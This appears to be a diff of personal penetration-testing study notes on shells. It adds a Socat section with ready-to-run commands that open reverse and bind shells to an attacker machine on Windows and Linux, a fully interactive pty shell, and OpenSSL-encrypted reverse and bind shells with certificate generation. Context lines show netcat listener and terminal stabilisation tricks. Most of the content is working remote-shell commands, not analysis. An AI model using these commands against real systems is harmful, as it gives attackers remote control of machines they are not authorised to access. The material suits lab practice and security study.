@@ -16,11 +16,6 @@ rlwrap nc -lvnp <port>
 background the shell with Ctrl + Z, then use stty raw -echo; fg to stabilise and re-enter the shell.
 
 
-
-Socat
-Trabnsfer the socat binary to target via a netcat session
-
-
 we can get rows and columns list to know the page size by  stty -a. 
 Next, in your reverse/bind shell, type in:
 stty rows <number>
@@ -28,3 +23,68 @@ and
 stty cols <number>
 Filling in the numbers you got from running the command in your own terminal.
 This will change the registered width and height of the terminal, thus allowing programs such as text editors which rely on such information being accurate to correctly open.
+
+
+
+
+Socat
+Transfer the socat binary to target via a netcat session
+
+for reverse shell:
+socat TCP-L:<port> -
+On Windows we would use this command to connect back:
+socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
+for a Linux Target:
+socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"
+
+For Bind shell:
+
+
+To connect to any waiting listener
+socat TCP:<TARGET-IP>:<TARGET-PORT> -
+
+
+
+
+Very stable socat listener
+socat TCP-L:<port> FILE:`tty`,raw,echo=0
+and now on the target machine we run 
+socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
+
+we get very interactive shel
+
+
+
+
+
+
+
+Socat Encrypted Shell
+Replace TCP with OPENSSL
+We first need to generate a certificate in order to use encrypted shells. This is easiest to do on our attacking machine:
+
+openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
+
+We then need to merge the two created files into a single .pem file:
+cat shell.key shell.crt > shell.pem
+
+Now, when we set up our reverse shell listener, we use:
+socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
+
+To connect back, we would use:
+socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
+
+
+The same technique would apply for a bind shell:
+Target:
+socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
+
+Attacker:
+socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -
+
+
+
+
+
+
+
